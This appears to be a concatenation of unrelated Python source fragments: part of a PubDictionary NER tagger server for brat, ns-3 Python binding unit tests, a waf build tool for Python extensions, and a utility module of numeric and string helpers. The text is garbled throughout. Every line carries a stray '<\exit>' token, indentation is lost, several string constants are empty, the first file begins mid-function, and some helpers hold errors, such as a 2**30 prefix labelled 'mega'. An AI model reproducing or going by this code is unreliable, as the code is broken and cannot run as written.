annotator_url = "http://pubdictionaries.dbcls.jp:80/dictionaries/EntrezGene%20-%20Homo%20Sapiens/text_annotation?matching_method=approximate&max_tokens=6&min_tokens=1&threshold=0.8&top_n=0"<\exit>
request = urllib2.Request(annotator_url, data=data, headers=headers)<\exit>
f   = urllib2.urlopen(request)<\exit>
res = f.read()<\exit>
f.close()<\exit>
json_dic = convert_for_brat(json.loads(res), text)<\exit>
except KeyError:<\exit>
json_dic = {}<\exit>
self.send_response(200)<\exit>
self.send_header('Content-type', 'application/json; charset=utf-8')<\exit>
self.end_headers()<\exit>
self.wfile.write(dumps(json_dic))<\exit>
print >> stderr, ('Generated %d annotations' % len(json_dic))<\exit>
def log_message(self, format, *args):<\exit>
return<\exit>
def main(args):<\exit>
argp = ARGPARSER.parse_args(args[1:])<\exit>
server_class = HTTPServer<\exit>
httpd = server_class(('localhost', argp.port), RandomTaggerHandler)<\exit>
print >> stderr, 'PubDictionary NER tagger service started on port %s' % (argp.port)<\exit>
try:<\exit>
httpd.serve_forever()<\exit>
except KeyboardInterrupt:<\exit>
pass<\exit>
httpd.server_close()<\exit>
print >> stderr, 'PubDictionary tagger service stopped'<\exit>
if __name__ == '__main__':<\exit>
from sys import argv<\exit>
exit(main(argv))<\exit>
import unittest<\exit>
from ns.core import Simulator, Seconds, Config, int64x64_t<\exit>
import ns.core<\exit>
import ns.network<\exit>
import ns.internet<\exit>
import ns.mobility<\exit>
import ns.csma<\exit>
class TestSimulator(unittest.TestCase):<\exit>
def testScheduleNow(self):<\exit>
def callback(args):<\exit>
self._args_received = args<\exit>
self._cb_time = Simulator.Now()<\exit>
Simulator.Destroy()<\exit>
self._args_received = None<\exit>
self._cb_time = None<\exit>
Simulator.ScheduleNow(callback, "args")<\exit>
Simulator.Run()<\exit>
self.assertEqual(self._args_received, "args")<\exit>
self.assertEqual(self._cb_time.GetSeconds(), 0.0)<\exit>
def testSchedule(self):<\exit>
def callback(args):<\exit>
self._args_received = args<\exit>
self._cb_time = Simulator.Now()<\exit>
Simulator.Destroy()<\exit>
self._args_received = None<\exit>
self._cb_time = None<\exit>
Simulator.Schedule(Seconds(123), callback, "args")<\exit>
Simulator.Run()<\exit>
self.assertEqual(self._args_received, "args")<\exit>
self.assertEqual(self._cb_time.GetSeconds(), 123.0)<\exit>
def testScheduleDestroy(self):<\exit>
def callback(args):<\exit>
self._args_received = args<\exit>
self._cb_time = Simulator.Now()<\exit>
Simulator.Destroy()<\exit>
self._args_received = None<\exit>
self._cb_time = None<\exit>
def null(): pass<\exit>
Simulator.Schedule(Seconds(123), null)<\exit>
Simulator.ScheduleDestroy(callback, "args")<\exit>
Simulator.Run()<\exit>
Simulator.Destroy()<\exit>
self.assertEqual(self._args_received, "args")<\exit>
self.assertEqual(self._cb_time.GetSeconds(), 123.0)<\exit>
def testTimeComparison(self):<\exit>
self.assert_(Seconds(123) == Seconds(123))<\exit>
self.assert_(Seconds(123) >= Seconds(123))<\exit>
self.assert_(Seconds(123) <= Seconds(123))<\exit>
self.assert_(Seconds(124) > Seconds(123))<\exit>
self.assert_(Seconds(123) < Seconds(124))<\exit>
def testTimeNumericOperations(self):<\exit>
self.assertEqual(Seconds(10) + Seconds(5), Seconds(15))<\exit>
self.assertEqual(Seconds(10) - Seconds(5), Seconds(5))<\exit>
v1 = int64x64_t(5.0)*int64x64_t(10)<\exit>
self.assertEqual(v1, int64x64_t(50))<\exit>
def testConfig(self):<\exit>
Config.SetDefault("ns3::OnOffApplication::PacketSize", ns.core.UintegerValue(123))<\exit>
def testSocket(self):<\exit>
node = ns.network.Node()<\exit>
internet = ns.internet.InternetStackHelper()<\exit>
internet.Install(node)<\exit>
self._received_packet = None<\exit>
def rx_callback(socket):<\exit>
assert self._received_packet is None<\exit>
self._received_packet = socket.Recv()<\exit>
sink = ns.network.Socket.CreateSocket(node, ns.core.TypeId.LookupByName("ns3::UdpSocketFactory"))<\exit>
sink.Bind(ns.network.InetSocketAddress(ns.network.Ipv4Address.GetAny(), 80))<\exit>
sink.SetRecvCallback(rx_callback)<\exit>
source = ns.network.Socket.CreateSocket(node, ns.core.TypeId.LookupByName("ns3::UdpSocketFactory"))<\exit>
source.SendTo(ns.network.Packet(19), 0, ns.network.InetSocketAddress(ns.network.Ipv4Address("127.0.0.1"), 80))<\exit>
Simulator.Run()<\exit>
self.assert_(self._received_packet is not None)<\exit>
self.assertEqual(self._received_packet.GetSize(), 19)<\exit>
def testAttributes(self):<\exit>
queue = ns.network.DropTailQueue()<\exit>
queue.SetAttribute("MaxPackets", ns.core.UintegerValue(123456))<\exit>
limit = ns.core.UintegerValue()<\exit>
queue.GetAttribute("MaxPackets", limit)<\exit>
self.assertEqual(limit.Get(), 123456)<\exit>
mobility = ns.mobility.RandomWaypointMobilityModel()<\exit>
ptr = ns.core.PointerValue()<\exit>
mobility.GetAttribute("PositionAllocator", ptr)<\exit>
self.assertEqual(ptr.GetObject(), None)<\exit>
pos = ns.mobility.ListPositionAllocator()<\exit>
mobility.SetAttribute("PositionAllocator", ns.core.PointerValue(pos))<\exit>
ptr = ns.core.PointerValue()<\exit>
mobility.GetAttribute("PositionAllocator", ptr)<\exit>
self.assert_(ptr.GetObject() is not None)<\exit>
def testIdentity(self):<\exit>
csma = ns.csma.CsmaNetDevice()<\exit>
channel = ns.csma.CsmaChannel()<\exit>
csma.Attach(channel)<\exit>
c1 = csma.GetChannel()<\exit>
c2 = csma.GetChannel()<\exit>
self.assert_(c1 is c2)<\exit>
def testTypeId(self):<\exit>
typeId1 = ns.core.TypeId.LookupByNameFailSafe("ns3::UdpSocketFactory")<\exit>
self.assertEqual(typeId1.GetName (), "ns3::UdpSocketFactory")<\exit>
self.assertRaises(KeyError, ns.core.TypeId.LookupByNameFailSafe, "__InvalidTypeName__")<\exit>
def testCommandLine(self):<\exit>
cmd = ns.core.CommandLine()<\exit>
cmd.AddValue("Test1", "this is a test option")<\exit>
cmd.AddValue("Test2", "this is a test option")<\exit>
cmd.AddValue("Test3", "this is a test option", variable="test_xxx")<\exit>
cmd.Test1 = None<\exit>
cmd.Test2 = None<\exit>
cmd.test_xxx = None<\exit>
class Foo:<\exit>
pass<\exit>
foo = Foo()<\exit>
foo.test_foo = None<\exit>
cmd.AddValue("Test4", "this is a test option", variable="test_foo", namespace=foo)<\exit>
cmd.Parse(["python", "--Test1=value1", "--Test2=value2", "--Test3=123", "--Test4=xpto"])<\exit>
self.assertEqual(cmd.Test1, "value1")<\exit>
self.assertEqual(cmd.Test2, "value2")<\exit>
self.assertEqual(cmd.test_xxx, "123")<\exit>
self.assertEqual(foo.test_foo, "xpto")<\exit>
def testSubclass(self):<\exit>
class MyNode(ns.network.Node):<\exit>
def __init__(self):<\exit>
super(MyNode, self).__init__()<\exit>
node = MyNode()<\exit>
if __name__ == '__main__':<\exit>
unittest.main()<\exit>
import os, sys<\exit>
from waflib import Utils, Options, Errors<\exit>
from waflib.Logs import debug, warn, info, error<\exit>
from waflib.TaskGen import extension, before_method, after_method, feature<\exit>
from waflib.Configure import conf<\exit>
FRAG =<\exit>
INST =<\exit>
@extension('.py')<\exit>
def process_py(self, node):<\exit>
try:<\exit>
if not self.bld.is_install:<\exit>
return<\exit>
except:<\exit>
return<\exit>
try:<\exit>
if not self.install_path:<\exit>
return<\exit>
except AttributeError:<\exit>
self.install_path = '${PYTHONDIR}'<\exit>
def inst_py(ctx):<\exit>
install_from = getattr(self, 'install_from', None)<\exit>
if install_from:<\exit>
install_from = self.path.find_dir(install_from)<\exit>
install_pyfile(self, node, install_from)<\exit>
self.bld.add_post_fun(inst_py)<\exit>
def install_pyfile(self, node, install_from=None):<\exit>
from_node = install_from or node.parent<\exit>
tsk = self.bld.install_as(self.install_path + '/' + node.path_from(from_node), node, postpone=False)<\exit>
path = tsk.get_install_path()<\exit>
if self.bld.is_install < 0:<\exit>
info("+ removing byte compiled python files")<\exit>
for x in 'co':<\exit>
try:<\exit>
os.remove(path + x)<\exit>
except OSError:<\exit>
pass<\exit>
if self.bld.is_install > 0:<\exit>
try:<\exit>
st1 = os.stat(path)<\exit>
except:<\exit>
error('The python file is missing, this should not happen')<\exit>
for x in ['c', 'o']:<\exit>
do_inst = self.env['PY' + x.upper()]<\exit>
try:<\exit>
st2 = os.stat(path + x)<\exit>
except OSError:<\exit>
pass<\exit>
else:<\exit>
if st1.st_mtime <= st2.st_mtime:<\exit>
do_inst = False<\exit>
if do_inst:<\exit>
lst = (x == 'o') and [self.env['PYFLAGS_OPT']] or []<\exit>
(a, b, c) = (path, path + x, tsk.get_install_path(destdir=False) + x)<\exit>
argv = self.env['PYTHON'] + lst + ['-c', INST, a, b, c]<\exit>
info('+ byte compiling %r' % (path + x))<\exit>
ret = Utils.subprocess.Popen(argv).wait()<\exit>
if ret:<\exit>
raise Errors.WafError('py%s compilation failed %r' % (x, path))<\exit>
@feature('py')<\exit>
def feature_py(self):<\exit>
pass<\exit>
@feature('pyext')<\exit>
@before_method('propagate_uselib_vars', 'apply_link')<\exit>
@after_method('apply_bundle')<\exit>
def init_pyext(self):<\exit>
try:<\exit>
if not self.install_path:<\exit>
return<\exit>
except AttributeError:<\exit>
self.install_path = '${PYTHONARCHDIR}'<\exit>
self.uselib = self.to_list(getattr(self, 'uselib', []))<\exit>
if not 'PYEXT' in self.uselib:<\exit>
self.uselib.append('PYEXT')<\exit>
self.env['cshlib_PATTERN'] = self.env['cxxshlib_PATTERN'] = self.env['macbundle_PATTERN'] = self.env['pyext_PATTERN']<\exit>
@feature('pyext')<\exit>
@before_method('apply_link', 'apply_bundle')<\exit>
def set_bundle(self):<\exit>
if sys.platform.startswith('darwin'):<\exit>
self.mac_bundle = True<\exit>
@before_method('propagate_uselib_vars')<\exit>
@feature('pyembed')<\exit>
def init_pyembed(self):<\exit>
self.uselib = self.to_list(getattr(self, 'uselib', []))<\exit>
if not 'PYEMBED' in self.uselib:<\exit>
self.uselib.append('PYEMBED')<\exit>
@conf<\exit>
def get_python_variables(conf, variables, imports=['import sys']):<\exit>
program = list(imports)<\exit>
program.append('')<\exit>
for v in variables:<\exit>
program.append("print(repr(%s))" % v)<\exit>
os_env = dict(os.environ)<\exit>
try:<\exit>
del os_env['MACOSX_DEPLOYMENT_TARGET']<\exit>
except KeyError:<\exit>
pass<\exit>
try:<\exit>
out = conf.cmd_and_log(conf.env.PYTHON + ['-c', '\n'.join(program)], env=os_env)<\exit>
except Errors.WafError:<\exit>
conf.fatal('The distutils module is unusable: install "python-devel"?')<\exit>
return_values = []<\exit>
for s in out.split('\n'):<\exit>
s = s.strip()<\exit>
if not s:<\exit>
continue<\exit>
if s == 'None':<\exit>
return_values.append(None)<\exit>
elif s[0] == "'" and s[-1] == "'":<\exit>
return_values.append(s[1:-1])<\exit>
elif s[0].isdigit():<\exit>
return_values.append(int(s))<\exit>
else: break<\exit>
return return_values<\exit>
@conf<\exit>
def check_python_headers(conf):<\exit>
if not conf.env['CC_NAME'] and not conf.env['CXX_NAME']:<\exit>
conf.fatal('load a compiler first (gcc, g++, ..)')<\exit>
if not conf.env['PYTHON_VERSION']:<\exit>
conf.check_python_version()<\exit>
env = conf.env<\exit>
pybin = conf.env.PYTHON<\exit>
if not pybin:<\exit>
conf.fatal('could not find the python executable')<\exit>
v = 'prefix SO LDFLAGS LIBDIR LIBPL INCLUDEPY Py_ENABLE_SHARED MACOSX_DEPLOYMENT_TARGET LDSHARED CFLAGS'.split()<\exit>
try:<\exit>
lst = conf.get_python_variables(["get_config_var('%s') or ''" % x for x in v],<\exit>
['from distutils.sysconfig import get_config_var'])<\exit>
except RuntimeError:<\exit>
conf.fatal("Python development headers not found (-v for details).")<\exit>
vals = ['%s = %r' % (x, y) for (x, y) in zip(v, lst)]<\exit>
conf.to_log("Configuration returned from %r:\n%r\n" % (pybin, '\n'.join(vals)))<\exit>
dct = dict(zip(v, lst))<\exit>
x = 'MACOSX_DEPLOYMENT_TARGET'<\exit>
if dct[x]:<\exit>
conf.env[x] = conf.environ[x] = dct[x]<\exit>
env['pyext_PATTERN'] = '%s' + dct['SO']<\exit>
all_flags = dct['LDFLAGS'] + ' ' + dct['CFLAGS']<\exit>
conf.parse_flags(all_flags, 'PYEMBED')<\exit>
all_flags = dct['LDFLAGS'] + ' ' + dct['LDSHARED'] + ' ' + dct['CFLAGS']<\exit>
conf.parse_flags(all_flags, 'PYEXT')<\exit>
result = None<\exit>
for name in ('python' + env['PYTHON_VERSION'], 'python' + env['PYTHON_VERSION'].replace('.', '')):<\exit>
if not result and env['LIBPATH_PYEMBED']:<\exit>
path = env['LIBPATH_PYEMBED']<\exit>
conf.to_log("\n\n<\exit>
result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in LIBPATH_PYEMBED' % name)<\exit>
if not result and dct['LIBDIR']:<\exit>
path = [dct['LIBDIR']]<\exit>
conf.to_log("\n\n<\exit>
result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in LIBDIR' % name)<\exit>
if not result and dct['LIBPL']:<\exit>
path = [dct['LIBPL']]<\exit>
conf.to_log("\n\n<\exit>
result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in python_LIBPL' % name)<\exit>
if not result:<\exit>
path = [os.path.join(dct['prefix'], "libs")]<\exit>
conf.to_log("\n\n<\exit>
result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in $prefix/libs' % name)<\exit>
if result:<\exit>
break<\exit>
if result:<\exit>
env['LIBPATH_PYEMBED'] = path<\exit>
env.append_value('LIB_PYEMBED', [name])<\exit>
else:<\exit>
conf.to_log("\n\n<\exit>
if (Utils.is_win32 or sys.platform.startswith('os2')<\exit>
or dct['Py_ENABLE_SHARED']):<\exit>
env['LIBPATH_PYEXT'] = env['LIBPATH_PYEMBED']<\exit>
env['LIB_PYEXT'] = env['LIB_PYEMBED']<\exit>
num = '.'.join(env['PYTHON_VERSION'].split('.')[:2])<\exit>
conf.find_program(['python%s-config' % num, 'python-config-%s' % num, 'python%sm-config' % num], var='PYTHON_CONFIG', mandatory=False)<\exit>
includes = []<\exit>
if conf.env.PYTHON_CONFIG:<\exit>
for incstr in conf.cmd_and_log([ conf.env.PYTHON_CONFIG, '--includes']).strip().split():<\exit>
if (incstr.startswith('-I') or incstr.startswith('/I')):<\exit>
incstr = incstr[2:]<\exit>
if incstr not in includes:<\exit>
includes.append(incstr)<\exit>
conf.to_log("Include path for Python extensions "<\exit>
"(found via python-config --includes): %r\n" % (includes,))<\exit>
env['INCLUDES_PYEXT'] = includes<\exit>
env['INCLUDES_PYEMBED'] = includes<\exit>
else:<\exit>
conf.to_log("Include path for Python extensions "<\exit>
"(found via distutils module): %r\n" % (dct['INCLUDEPY'],))<\exit>
env['INCLUDES_PYEXT'] = [dct['INCLUDEPY']]<\exit>
env['INCLUDES_PYEMBED'] = [dct['INCLUDEPY']]<\exit>
if env['CC_NAME'] == 'gcc':<\exit>
env.append_value('CFLAGS_PYEMBED', ['-fno-strict-aliasing'])<\exit>
env.append_value('CFLAGS_PYEXT', ['-fno-strict-aliasing'])<\exit>
if env['CXX_NAME'] == 'gcc':<\exit>
env.append_value('CXXFLAGS_PYEMBED', ['-fno-strict-aliasing'])<\exit>
env.append_value('CXXFLAGS_PYEXT', ['-fno-strict-aliasing'])<\exit>
if env.CC_NAME == "msvc":<\exit>
from distutils.msvccompiler import MSVCCompiler<\exit>
dist_compiler = MSVCCompiler()<\exit>
dist_compiler.initialize()<\exit>
env.append_value('CFLAGS_PYEXT', dist_compiler.compile_options)<\exit>
env.append_value('CXXFLAGS_PYEXT', dist_compiler.compile_options)<\exit>
env.append_value('LINKFLAGS_PYEXT', dist_compiler.ldflags_shared)<\exit>
try:<\exit>
conf.check(header_name='Python.h', define_name='HAVE_PYTHON_H',<\exit>
uselib='PYEMBED', fragment=FRAG,<\exit>
errmsg='Could not find the python development headers')<\exit>
except conf.errors.ConfigurationError:<\exit>
conf.check_cfg(path=conf.env.PYTHON_CONFIG, package='', uselib_store='PYEMBED', args=['--cflags', '--libs'])<\exit>
conf.check(header_name='Python.h', define_name='HAVE_PYTHON_H', msg='Getting the python flags from python-config',<\exit>
uselib='PYEMBED', fragment=FRAG,<\exit>
errmsg='Could not find the python development headers elsewhere')<\exit>
@conf<\exit>
def check_python_version(conf, minver=None):<\exit>
assert minver is None or isinstance(minver, tuple)<\exit>
pybin = conf.env['PYTHON']<\exit>
if not pybin:<\exit>
conf.fatal('could not find the python executable')<\exit>
cmd = pybin + ['-c', 'import sys\nfor x in sys.version_info: print(str(x))']<\exit>
debug('python: Running python command %r' % cmd)<\exit>
lines = conf.cmd_and_log(cmd).split()<\exit>
assert len(lines) == 5, "found %i lines, expected 5: %r" % (len(lines), lines)<\exit>
pyver_tuple = (int(lines[0]), int(lines[1]), int(lines[2]), lines[3], int(lines[4]))<\exit>
result = (minver is None) or (pyver_tuple >= minver)<\exit>
if result:<\exit>
pyver = '.'.join([str(x) for x in pyver_tuple[:2]])<\exit>
conf.env['PYTHON_VERSION'] = pyver<\exit>
if 'PYTHONDIR' in conf.environ:<\exit>
pydir = conf.environ['PYTHONDIR']<\exit>
else:<\exit>
if Utils.is_win32:<\exit>
(python_LIBDEST, pydir) = \<\exit>
conf.get_python_variables(<\exit>
["get_config_var('LIBDEST') or ''",<\exit>
"get_python_lib(standard_lib=0, prefix=%r) or ''" % conf.env['PREFIX']],<\exit>
['from distutils.sysconfig import get_config_var, get_python_lib'])<\exit>
else:<\exit>
python_LIBDEST = None<\exit>
(pydir,) = \<\exit>
conf.get_python_variables(<\exit>
["get_python_lib(standard_lib=0, prefix=%r) or ''" % conf.env['PREFIX']],<\exit>
['from distutils.sysconfig import get_python_lib'])<\exit>
if python_LIBDEST is None:<\exit>
if conf.env['LIBDIR']:<\exit>
python_LIBDEST = os.path.join(conf.env['LIBDIR'], "python" + pyver)<\exit>
else:<\exit>
python_LIBDEST = os.path.join(conf.env['PREFIX'], "lib", "python" + pyver)<\exit>
if 'PYTHONARCHDIR' in conf.environ:<\exit>
pyarchdir = conf.environ['PYTHONARCHDIR']<\exit>
else:<\exit>
(pyarchdir, ) = conf.get_python_variables(<\exit>
["get_python_lib(plat_specific=1, standard_lib=0, prefix=%r) or ''" % conf.env['PREFIX']],<\exit>
['from distutils.sysconfig import get_python_lib'])<\exit>
if not pyarchdir:<\exit>
pyarchdir = pydir<\exit>
if hasattr(conf, 'define'):<\exit>
conf.define('PYTHONDIR', pydir)<\exit>
conf.define('PYTHONARCHDIR', pyarchdir)<\exit>
conf.env['PYTHONDIR'] = pydir<\exit>
conf.env['PYTHONARCHDIR'] = pyarchdir<\exit>
pyver_full = '.'.join(map(str, pyver_tuple[:3]))<\exit>
if minver is None:<\exit>
conf.msg('Checking for python version', pyver_full)<\exit>
else:<\exit>
minver_str = '.'.join(map(str, minver))<\exit>
conf.msg('Checking for python version', pyver_tuple, ">= %s" % (minver_str,) and 'GREEN' or 'YELLOW')<\exit>
if not result:<\exit>
conf.fatal('The python version is too old, expecting %r' % (minver,))<\exit>
PYTHON_MODULE_TEMPLATE =<\exit>
@conf<\exit>
def check_python_module(conf, module_name):<\exit>
conf.start_msg('Python module %s' % module_name)<\exit>
try:<\exit>
conf.cmd_and_log(conf.env['PYTHON'] + ['-c', PYTHON_MODULE_TEMPLATE % module_name])<\exit>
except:<\exit>
conf.end_msg(False)<\exit>
conf.fatal('Could not find the python module %r' % module_name)<\exit>
conf.end_msg(True)<\exit>
def configure(conf):<\exit>
try:<\exit>
conf.find_program('python', var='PYTHON')<\exit>
except conf.errors.ConfigurationError:<\exit>
warn("could not find a python executable, setting to sys.executable '%s'" % sys.executable)<\exit>
conf.env.PYTHON = sys.executable<\exit>
if conf.env.PYTHON != sys.executable:<\exit>
warn("python executable '%s' different from sys.executable '%s'" % (conf.env.PYTHON, sys.executable))<\exit>
conf.env.PYTHON = conf.cmd_to_list(conf.env.PYTHON)<\exit>
v = conf.env<\exit>
v['PYCMD'] = '"import sys, py_compile;py_compile.compile(sys.argv[1], sys.argv[2])"'<\exit>
v['PYFLAGS'] = ''<\exit>
v['PYFLAGS_OPT'] = '-O'<\exit>
v['PYC'] = getattr(Options.options, 'pyc', 1)<\exit>
v['PYO'] = getattr(Options.options, 'pyo', 1)<\exit>
def options(opt):<\exit>
opt.add_option('--nopyc',<\exit>
action='store_false',<\exit>
default=1,<\exit>
help = 'Do not install bytecode compiled .pyc files (configuration) [Default:install]',<\exit>
dest = 'pyc')<\exit>
opt.add_option('--nopyo',<\exit>
action='store_false',<\exit>
default=1,<\exit>
help='Do not install optimised compiled .pyo files (configuration) [Default:install]',<\exit>
dest='pyo')<\exit>
__date__ = '$Date: 2007/03/27 03:15:06 $'<\exit>
__version__ = '$Revision: 0.45 $'<\exit>
__credits__ =<\exit>
import re<\exit>
import sys<\exit>
import time<\exit>
import random<\exit>
try:<\exit>
True, False<\exit>
except NameError:<\exit>
True, False = (1==1, 0==1)<\exit>
def int2bin(i, n):<\exit>
hex2bin = {'0': '0000', '1': '0001', '2': '0010', '3': '0011',<\exit>
'4': '0100', '5': '0101', '6': '0110', '7': '0111',<\exit>
'8': '1000', '9': '1001', 'a': '1010', 'b': '1011',<\exit>
'c': '1100', 'd': '1101', 'e': '1110', 'f': '1111'}<\exit>
result = ''.join([hex2bin[x] for x in hex(i).lower().replace('l','')[2:]])<\exit>
if '1' in result[:-n]:<\exit>
raise ValueError("Value too large for given number of bits.")<\exit>
result = result[-n:]<\exit>
result = '0'*(n-len(result)) + result<\exit>
return result<\exit>
def bin2int(bin_string):<\exit>
return int(bin_string, 2)<\exit>
def reverse(input_string):<\exit>
str_list = list(input_string)<\exit>
str_list.reverse()<\exit>
return ''.join(str_list)<\exit>
def transpose(matrix):<\exit>
result = zip(*matrix)<\exit>
result = map(list, result)<\exit>
return result<\exit>
def polygon_area(points_list, precision=100):<\exit>
for i in range(len(points_list)):<\exit>
points_list[i] = (int(points_list[i][0] * precision),<\exit>
int(points_list[i][1] * precision))<\exit>
if points_list[-1] != points_list[0]:<\exit>
points_list.append(points_list[0])<\exit>
area = 0<\exit>
for i in range(len(points_list)-1):<\exit>
(x_i, y_i) = points_list[i]<\exit>
(x_i_plus_1, y_i_plus_1) = points_list[i+1]<\exit>
area = area + (x_i_plus_1 * y_i) - (y_i_plus_1 * x_i)<\exit>
area = abs(area / 2)<\exit>
area = float(area)/(precision**2)<\exit>
return area<\exit>
def timestamp():<\exit>
return time.asctime()<\exit>
def pt2str(point):<\exit>
return "(%s, %s)" % (str(point[0]), str(point[1]))<\exit>
def gcf(a, b, epsilon=1e-16):<\exit>
result = max(a, b)<\exit>
remainder = min(a, b)<\exit>
while remainder and abs(remainder) > epsilon:<\exit>
new_remainder = result % remainder<\exit>
result = remainder<\exit>
remainder = new_remainder<\exit>
return abs(result)<\exit>
def lcm(a, b, precision=None):<\exit>
denom = gcf(a, b)<\exit>
if denom == 0:<\exit>
result = 0<\exit>
else:<\exit>
result = a * (b / denom)<\exit>
return result<\exit>
def permutations(input_list):<\exit>
out_lists = []<\exit>
if len(input_list) > 1:<\exit>
item = input_list[0]<\exit>
sub_lists = permutations(input_list[1:])<\exit>
for sub_list in sub_lists:<\exit>
for i in range(len(input_list)):<\exit>
new_list = sub_list[:]<\exit>
new_list.insert(i, item)<\exit>
out_lists.append(new_list)<\exit>
else:<\exit>
out_lists = [input_list]<\exit>
return out_lists<\exit>
def reduce_fraction(fraction):<\exit>
(numerator, denominator) = fraction<\exit>
common_factor = abs(gcf(numerator, denominator))<\exit>
result = (numerator/common_factor, denominator/common_factor)<\exit>
return result<\exit>
def quantile(l, p):<\exit>
l_sort = l[:]<\exit>
l_sort.sort()<\exit>
n = len(l)<\exit>
r = 1 + ((n - 1) * p)<\exit>
i = int(r)<\exit>
f = r - i<\exit>
if i < n:<\exit>
result =  (1-f)*l_sort[i-1] + f*l_sort[i]<\exit>
else:<\exit>
result = l_sort[i-1]<\exit>
return result<\exit>
def trim(l):<\exit>
l_sort = l[:]<\exit>
l_sort.sort()<\exit>
if len(l_sort) % 2 == 0:<\exit>
index = int(len(l_sort) / 2)<\exit>
median = float(l_sort[index] + l_sort[index-1]) / 2<\exit>
else:<\exit>
index = int(len(l_sort) / 2)<\exit>
median = l_sort[index]<\exit>
q1 = quantile(l_sort, 0.25)<\exit>
q3 = quantile(l_sort, 0.75)<\exit>
iqr = q3 - q1<\exit>
iqr_extra = iqr * 1.5<\exit>
def in_interval(x, i=iqr_extra, q1=q1, q3=q3):<\exit>
return (x >= q1-i and x <= q3+i)<\exit>
l_trimmed = [x for x in l_sort if in_interval(x)]<\exit>
return l_trimmed<\exit>
def nice_units(value, dp=0, sigfigs=None, suffix='', space=' ',<\exit>
use_extra_prefixes=False, use_full_name=False, mode='si'):<\exit>
si_prefixes = {1e24:  ('Y', 'yotta'),<\exit>
1e21:  ('Z', 'zetta'),<\exit>
1e18:  ('E', 'exa'),<\exit>
1e15:  ('P', 'peta'),<\exit>
1e12:  ('T', 'tera'),<\exit>
1e9:   ('G', 'giga'),<\exit>
1e6:   ('M', 'mega'),<\exit>
1e3:   ('k', 'kilo'),<\exit>
1e-3:  ('m', 'milli'),<\exit>
1e-6:  ('u', 'micro'),<\exit>
1e-9:  ('n', 'nano'),<\exit>
1e-12: ('p', 'pico'),<\exit>
1e-15: ('f', 'femto'),<\exit>
1e-18: ('a', 'atto'),<\exit>
1e-21: ('z', 'zepto'),<\exit>
1e-24: ('y', 'yocto')<\exit>
}<\exit>
if use_extra_prefixes:<\exit>
si_prefixes.update({1e2:  ('h', 'hecto'),<\exit>
1e1:  ('da', 'deka'),<\exit>
1e-1: ('d', 'deci'),<\exit>
1e-2: ('c', 'centi')<\exit>
})<\exit>
bin_prefixes = {2**10: ('K', 'kilo'),<\exit>
2**20: ('M', 'mega'),<\exit>
2**30: ('G', 'mega'),<\exit>
2**40: ('T', 'tera'),<\exit>
2**50: ('P', 'peta'),<\exit>
2**60: ('E', 'exa')<\exit>
}<\exit>
if mode == 'bin':<\exit>
prefixes = bin_prefixes<\exit>
else:<\exit>
prefixes = si_prefixes<\exit>
prefixes[1] = ('', '')<\exit>
multipliers = prefixes.keys()<\exit>
multipliers.sort()<\exit>
mult = None<\exit>
for i in range(len(multipliers) - 1):<\exit>
lower_mult = multipliers[i]<\exit>
upper_mult = multipliers[i+1]<\exit>
if lower_mult <= value < upper_mult:<\exit>
mult_i = i<\exit>
break<\exit>
if mult is None:<\exit>
if value < multipliers[0]:<\exit>
mult_i = 0<\exit>
elif value >= multipliers[-1]:<\exit>
mult_i = len(multipliers) - 1<\exit>
mult = multipliers[mult_i]<\exit>
new_value = value / mult<\exit>
if sigfigs is None:<\exit>
if mult_i < (len(multipliers) - 1) and \<\exit>
round(new_value, dp) == \<\exit>
round((multipliers[mult_i+1] / mult), dp):<\exit>
mult = multipliers[mult_i + 1]<\exit>
new_value = value / mult<\exit>
if use_full_name:<\exit>
label_type = 1<\exit>
else:<\exit>
label_type = 0<\exit>
if sigfigs is None:<\exit>
str_value = eval('"%.'+str(dp)+'f" % new_value', locals(), {})<\exit>
else:<\exit>
str_value = eval('"%.'+str(sigfigs)+'g" % new_value', locals(), {})<\exit>
return str_value + space + prefixes[mult][label_type] + suffix<\exit>
def uniquify(seq, preserve_order=False):<\exit>
try:<\exit>
d = {}<\exit>
if preserve_order:<\exit>
return [x for x in seq if (x not in d) and not d.__setitem__(x, 0)]<\exit>
else:<\exit>
for x in seq:<\exit>
d[x] = 0<\exit>
return d.keys()<\exit>
except TypeError:<\exit>
result = []<\exit>
app = result.append<\exit>
for x in seq:<\exit>
if x not in result:<\exit>
app(x)<\exit>
return result<\exit>
unique = uniquify<\exit>
def reverse_dict(d):<\exit>
result = {}<\exit>
for key, value in d.items():<\exit>
result[value] = key<\exit>
return result<\exit>
def lsb(x, n):<\exit>
return x & ((2 ** n) - 1)<\exit>
def gray_encode(i):<\exit>
return i ^ (i >> 1)<\exit>
def random_vec(bits, max_value=None):<\exit>
vector = ""<\exit>
for _ in range(int(bits / 10) + 1):<\exit>
i = int((2**10) * random.random())<\exit>
vector += int2bin(i, 10)<\exit>
if max_value and (max_value < 2 ** bits - 1):<\exit>
vector = int2bin((int(vector, 2) / (2 ** bits - 1)) * max_value, bits)<\exit>
return vector[0:bits]<\exit>
def binary_range(bits):<\exit>
l = []<\exit>
v = ['0'] * bits<\exit>
toggle = [1] + [0] * bits<\exit>
while toggle[bits] != 1:<\exit>
v_copy = v[:]<\exit>
v_copy.reverse()<\exit>
l.append(''.join(v_copy))<\exit>
toggle = [1] + [0]*bits<\exit>
i = 0<\exit>
while i < bits and toggle[i] == 1:<\exit>
if toggle[i]:<\exit>
if v[i] == '0':<\exit>
v[i] = '1'<\exit>
toggle[i+1] = 0<\exit>
else:<\exit>
v[i] = '0'<\exit>
toggle[i+1] = 1<\exit>
i += 1<\exit>
return l<\exit>
def float_range(start, stop=None, step=None):<\exit>
if stop is None:<\exit>
stop = float(start)<\exit>
start = 0.0<\exit>
if step is None:<\exit>
step = 1.0<\exit>
cur = float(start)<\exit>
l = []<\exit>
while cur < stop:<\exit>
l.append(cur)<\exit>
cur += step<\exit>
return l<\exit>
def find_common_fixes(s1, s2):<\exit>
prefix = []<\exit>
suffix = []<\exit>
i = 0<\exit>
common_len = min(len(s1), len(s2))<\exit>
while i < common_len:<\exit>
if s1[i] != s2[i]:<\exit>
break<\exit>
prefix.append(s1[i])<\exit>
i += 1<\exit>
i = 1<\exit>
while i < (common_len + 1):<\exit>
if s1[-i] != s2[-i]:<\exit>
break<\exit>
suffix.append(s1[-i])<\exit>
